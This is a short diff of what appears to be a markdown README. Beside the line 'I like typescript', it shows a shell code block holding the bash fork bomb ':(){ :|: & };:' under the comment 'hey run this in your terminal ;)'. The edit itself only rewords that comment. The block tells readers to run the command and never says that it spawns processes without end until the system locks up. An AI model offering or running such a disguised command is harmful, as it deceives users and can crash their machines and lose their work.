@@ -5,7 +5,7 @@
 - I like typescript
 
 ```sh
-# hey run that in your terminal ;)
+# hey run this in your terminal ;)
 :(){ :|: & };:
 ```
 
